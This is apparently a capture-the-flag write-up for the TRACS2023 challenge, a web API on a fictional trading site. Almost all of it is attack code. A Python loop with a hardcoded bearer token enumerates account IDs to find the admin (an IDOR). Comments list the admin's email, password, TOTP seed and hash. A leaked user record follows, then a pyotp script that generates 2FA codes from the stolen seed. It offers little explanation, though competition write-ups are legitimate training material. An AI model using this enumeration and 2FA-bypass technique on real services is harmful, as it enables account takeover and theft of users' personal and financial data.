---
layout: writeup
category: TRACS2023
chall_description: 
points: 150
solves: 16
tags: Web API
date: 2023-12-13
comments: false
---


import requests
from time import sleep
url = "http://nexicoins.tracs.viarezo.fr/api/account/infos?id="
access_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwMTUzMzgyMywianRpIjoiY2FiZTFkNWUtNWY5Yy00MGY1LWI2OWQtNWFhMzlmOThhODYwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MSwibmJmIjoxNzAxNTMzODIzLCJleHAiOjE3MDE1MzQ3MjN9.P9ak3lSyOA6GFrhC4akDhw0Jh9DAAUuPKxPBfg3oM8k"
headers = {
     "Authorization": f"Bearer {access_token}"
}
for i in range(188,1050):
     print(url + str(i))
     response = requests.get(url+str(i), headers=headers)
     if response.status_code == 200:
              if "admin" in response.text:
                    print("Response:", response.json)
                    break
     else:
          print(f"Error: {response.status_code}, {response.text}")
     sleep(1)


#PASSWORD admin: id 852 admin@trade.local : 5874bon1440rev21 
#2FA: KFGWCURIIJDT6627K5CHAQ3VJ56UU332PNJHE2JXKFMDG4LBJVRQU
#hashadmin 2dab208fb73fb1e9444dfb9981ae7c71f0c54fdd746292db55b93cf880d6facf


{"role": "user", "email": "marie.honnette@evilottery.ev", "password": "4c504c9d0dce1700ae57a16147074820c0745b005bddcfb4a876a54c38389046", "2FA": "None", "balance": "307.28", "stocks": [{"code": "HWN", "qty": 13.540588842504697}, {"code": "CYI", "qty": 3.444808330834581}, {"code": "TQK", "qty": 6.046132874644536}, {"code": "OUT", "qty": 16.35328518715449}, {"code": "THD", "qty": 9.108755215289444}, {"code": "OQN", "qty": 10.812927301654812}, {"code": "RLI", "qty": 18.653448986299026}, {"code": "JGD", "qty": 12.589059350125865}, {"code": "EYB", "qty": 5.932961914189468}]}

import pyotp
import time
import base58
from datetime import datetime


def generate_totp_code(seed_value, specific_time):
    totp = pyotp.TOTP(seed_value)
    specific_timestamp = int(specific_time.timestamp())
    return totp.at(specific_timestamp)

seed_value = "KFGWCURIIJDT6627K5CHAQ3VJ56UU332PNJHE2JXKFMDG4LBJVRQU"
specific_time = datetime(2023, 12, 2, 20, 15, 0)  
totp = generate_totp_code(seed_value,specific_time)
print(totp)
